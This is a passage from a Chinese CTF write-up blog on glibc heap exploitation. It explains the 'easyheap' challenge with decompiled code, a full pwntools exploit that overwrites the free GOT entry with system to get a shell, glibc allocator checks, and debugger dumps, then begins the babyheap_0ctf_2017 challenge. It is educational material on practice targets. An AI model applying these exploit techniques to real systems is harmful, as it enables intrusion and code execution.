class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指针置NULL了，无法uaf<br>先放exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26323</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Content of heap :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">heaparray_add=<span class="number">0x06020e0</span></span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sys_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#这里申请0x60-0x6f大小的chunk均可，因为都会放入实际大小0x70的fastbin中</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x71</span>) + p64(heaparray_add-<span class="number">0x33</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x23</span>+p64(free_got)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line">payload3=p64(sys_plt)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload3),payload3)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>checksec看一眼<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">turing@LAPTOP-6JKPOVPE:~$ checksec easyheap</span><br><span class="line">[*] <span class="string">&#x27;/home/turing/easyheap&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x3fe000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>无PIE且got表可写<br>无法uaf，无法double free，但可以多次申请堆块，存在溢出，这里考虑fastbin attack<br><strong>关于double free，因为fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空，且fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证</strong>（在glibc2.29+版本，当chunk将要被放到<code>tcachebin</code>中时，其<code>key</code>字段（<code>fd</code>之后的<code>0x8</code>字节）会被设置为特定值，当free某个chunk时，会检查对应<code>tcachebin</code>中的chunk有无<code>key</code>值与待释放的chunk相等的，如果有则触发安全检测报错，无则free。且当chunk从<code>tcachebin</code>中取出时，<code>key</code>字段会被置为NULL，见<a href="https://r3t2.top/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/">另一篇blog</a>），我们考虑chunk1和chunk2，先后free掉chunk1和chunk2，然后再次free chunk2时，便不会被检测到，因为第二次释放chunk2时，fastbin头部是chunk1。<br>在这个过程中，fastbin这样变化<br></p><p><img src="/images/fastbin_free_chunk1.png"></p><p><img src="/images/fastbin_free_chunk2.png"></p><p><img src="/images/fastbin_free_chunk3.png"></p><p><strong>fastbin中取出chunk是从头部开始取的，放入也是头部插入</strong>，所以此时我们再申请一个同样大小的chunk，便会返回chunk1，这时我们便可以修改chunk1的fd域，伪造一个fake_heap（因为被双重释放，chunk1可以看做还在fastbin里，接在chunk2后），然后我们再申请申请一个同样大小的chunk，返回chunk2，再申请一个同样大小的chunk，返回chunk1，,这时再申请申请一个同样大小的chunk时，便会返回我们想要控制的fake_heap，实现任意地址写（其实需要布置fake_heap的size域使得满足fastbin的要求）<br>值得一提的是，<strong>除了tcachebin中的chunk，其他bin中的chunk的fd和bk指针都是指向堆头地址</strong>，而tcachebin中的chunk的fd指针指向的是mem地址（在<code>safe-linking</code>引入后又有变化，见<a href="https://r3t2.top/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/">另一篇blog</a>）<br>这里无法double free，也不能uaf，怎么实现fastbin attack呢？利用溢出就好了，其实无论是uaf，还是double free，还是溢出，都是实现对fastbin中的chunk进行修改，来实现申请回我们控制地址的fake_heap<br>我们回到题目，此题利用heaparray指针数组来索引各个堆块，我们可以直接在ida中看到heaparray的起始地址<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020E0 heaparray       dq ?                    ; DATA XREF: create_heap+30↑r</span><br></pre></td></tr></table></figure><p>地址为0x6020e0，我们先申请三个堆块，heaparray[0]指向的便是chunk0。我们再edit chunk0时，是利用heaparray[0]索引的，如果我们先把&#x2F;bin&#x2F;sh写入chunk1，再修改heaparray[0]为free的got表地址，此时edit chunk0时其实就是在修改free的got表项，改为system函数后，我们再free chunk1时，其实就是执行system(“&#x2F;bin&#x2F;sh”);<br>于是我们先申请chunk0，chunk1，chunk2，free掉chunk2，再edit chunk1溢出修改chunk2的fd（在bin中的chunk堆头后的数据区的前0x8字节就是fd指针）为heaparray之前的某个地址，我们需要在heaparray附近寻找合适的位置，使得fake_chunk的size域满足fastbin的要求<br>在更高版本的glibc（2.28+）中，fastbin会检查放入和取出的chunk严格满足对应fastbin的size，相同size的chunk才置于同一个fastbin，部分源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新增：严格校验 size 精确匹配链表要求的大小</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (victim) != size)) </span><br><span class="line">&#123;</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): invalid fastbin size&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留索引检查</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fastbin_index (size) != idx)) </span><br><span class="line">&#123;</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留下一个 chunk 大小检查</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (nextsize &gt;= av-&gt;system_mem)) </span><br><span class="line">&#123;</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): invalid next size (fast)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题版本为2.23，早期glibc并不会严格检查fake_chunk的size，索引满足即可。在glibc2.23检查的部分源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查 1: 是否属于当前 fastbin 链表</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 2: 下一个 chunk 的 size 是否合法</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect(chunksize_nomask(chunk_at_offset(victim, size)) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">    __builtin_expect(chunksize(chunk_at_offset(victim, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出并没有对size的严格检查。其中，检查1的index计算方式如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index = (size &gt;&gt; <span class="number">4</span>) - <span class="number">2</span>  </span><br></pre></td></tr></table></figure><p>此题我们找到这个heaparray-0x33这个地址<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x6020e0-0x33</span><br><span class="line">0x6020ad:       0xfff7bc38e0000000      0x000000000000007f</span><br><span class="line">0x6020bd:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020cd:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020dd:       0x0000603010000000      0x0000603030000000</span><br><span class="line">0x6020ed &lt;heaparray+13&gt;:        0x0000603050000000      0x0000000000000000</span><br><span class="line">0x6020fd &lt;heaparray+29&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60210d &lt;heaparray+45&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60211d &lt;heaparray+61&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60212d &lt;heaparray+77&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60213d:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>发现这个位置的fake_chunk的size域为0x7f，索引(0x7f&gt;&gt;4)-2&#x3D;5&#x3D;(0x70&gt;&gt;4)-2，对于0x70大小的fastbin可以通过检查。至于下一个chunk的size，这个fake_chunk的fd域为0，自然不用考虑了。于是利用这个fake_chunk来修改heaparray[0]。<br>注意在edit chunk1来溢出修改chunk2的fd域时，要保证chunk2的size域为0x71不变以防从fastbin申请回chunk2时出现异常<br></p><h2 id="0x03-babyheap-0ctf-2017"><a href="#0x03-babyheap-0ctf-2017" class="headerlink" title="0x03 babyheap_0ctf_2017"></a>0x03 babyheap_0ctf_2017</h2><h3 id="复现-unsorted-bin-leak-fastbin-attack-one-gadget-malloc-hook-heapoverflow"><a href="#复现-unsorted-bin-leak-fastbin-attack-one-gadget-malloc-hook-heapoverflow" class="headerlink" title="复现&#x2F;unsorted bin leak&#x2F;fastbin attack&#x2F;one_gadget&#x2F;malloc_hook&#x2F;heapoverflow"></a>复现&#x2F;unsorted bin leak&#x2F;fastbin attack&#x2F;one_gadget&#x2F;malloc_hook&#x2F;heapoverflow</h3><p>题目源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu(a1, a2);</span><br><span class="line">    <span class="keyword">switch</span> ( sub_138C() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Allocate((__int64)v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Free(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Dump(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Allocate函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_D48</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_138C();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题中这些堆操作函数中的sub_138c函数功能是将输入的字符串转为数字，这里就不放这个函数的源码了<br>循环16次，存在16个可用空间。每次申请i从0到15循环，找到未被使用且满足要求的chunk，并返回对应的i作为index编号<br>Edit函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_E7F</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = sub_138C();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次要求输入size，不限制输入大小，可以堆溢出<br>Free函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_F50</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(<span class="number">24LL</span> * v2 + a1) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>));</span><br><span class="line">      result = <span class="number">24LL</span> * v2 + a1;</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放后指针置0，不能uaf，但可以双重释放进行fastbin attack<br>fee后对应的记录该chunk是否被使用的值会被重新设置为0<br>Dump函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1051</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印堆块内容，可以用于泄露fd指针<br></p><p>先放exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 